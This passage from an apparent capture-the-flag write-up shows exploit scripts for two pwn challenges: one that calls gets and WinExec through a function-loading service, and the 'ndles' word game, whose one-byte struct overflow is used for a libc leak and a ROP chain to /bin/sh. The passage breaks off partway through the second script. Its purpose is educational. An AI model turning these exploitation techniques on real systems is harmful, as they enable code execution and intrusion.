</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;\x02\r\n&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Result: 0\r\n&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Which module would you like to load?\r\n&#39;</span>
</span></span></code></pre></div><p>By referring to this <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170">page</a>, I see that ENOENT has a value equal to 2, so it&rsquo;s equivalent to the error string <code>the command interpreter can't be found</code>.</p>
<h2 id="solve-script-2">Solve script</h2>
<p><code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(out)
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;kernel32.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;WinExec&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./submitter&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LiveCTF{&#39;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Flag: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, flag)
</span></span></code></pre></div><p><code>solve1.py</code> (didn&rsquo;t work on remote)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>errno_ <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(errno_))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd.exe&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="pwn---ndles">Pwn - ndles</h1>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-4">Source-code overview</h2>
<p>This challenge provides a small game, we can define the length of the solution and the number of attempts to guess.</p>
<p>The 2 following structs which the challenge uses to handle the game.</p>
<p><code>game_t</code> struct</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">game_t</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> guess_cnt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">guess_t</span> guess[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">guess_t</span> sol;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>guess_t</code> struct</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">guess_t</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> letter_cnt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> letters[<span style="color:#ae81ff">9</span>];
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><h2 id="bug-1">Bug</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> ( sol_length <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10u</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( guess_cnt <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8u</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      game.guess_cnt <span style="color:#f92672">=</span> guess_cnt;
</span></span><span style="display:flex;"><span>      game.sol.letter_cnt <span style="color:#f92672">=</span> sol_length;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> game.sol.letter_cnt; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>        game.sol.letters[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> game.guess_cnt; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        game.guess[j].letter_cnt <span style="color:#f92672">=</span> game.sol.letter_cnt;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> game.guess[j].letter_cnt; <span style="color:#f92672">++</span>k )
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>savedregs <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> k <span style="color:#f92672">-</span> <span style="color:#ae81ff">142</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">6u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">8u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span>;
</span></span><span style="display:flex;"><span>      v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( m <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; m <span style="color:#f92672">&lt;</span> game.guess_cnt; <span style="color:#f92672">++</span>m )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;What is your guess #%d?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(m <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> game.guess[m].letter_cnt; <span style="color:#f92672">++</span>n )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>            v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( ((<span style="color:#f92672">*</span><span style="color:#a6e22e">__ctype_b_loc</span>())[(<span style="color:#66d9ef">char</span>)v10] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>savedregs <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> m <span style="color:#f92672">+</span> n <span style="color:#f92672">-</span> <span style="color:#ae81ff">142</span>) <span style="color:#f92672">=</span> v10;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;=</span> m; <span style="color:#f92672">++</span>ii )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">print_guess</span>(<span style="color:#f92672">&amp;</span>game.guess[ii], <span style="color:#f92672">&amp;</span>game.sol);
</span></span><span style="display:flex;"><span>        v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( jj <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; jj <span style="color:#f92672">&lt;</span> game.sol.letter_cnt; <span style="color:#f92672">++</span>jj )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>savedregs <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> m <span style="color:#f92672">+</span> jj <span style="color:#f92672">-</span> <span style="color:#ae81ff">142</span>) <span style="color:#f92672">!=</span> game.sol.letters[jj] )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v8 )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v13 )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;That&#39;s the correct word! You win!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You couldn&#39;t guess the word! You lose!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Guess count too long!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Solution length too long!&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The only bug I founded in this main function is the one-byte overflow to the next struct because it&rsquo;s allows us to define up to 10 of solution length =))</p>
<p>So, I leveraged this to leak and did a basic BufferOverFlow.</p>
<h2 id="solve-script-3">Solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./challenge_patched&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, PORT)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; be?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;10&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; get?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;7&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your guess #1?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123456789</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x6c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your guess #2?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, pay)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your guess #3?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;30;42m &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;30;43m &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0x9b</span>:<span style="color:#ae81ff">0x9b</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x29d90</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc &#34;</span><span style="color:#f92672">+</span>hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x6c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x81</span><span style="color:#e6db74">&#34;</span> 
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002a3e5</span>) <span style="color:#f92672">+</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>))) 
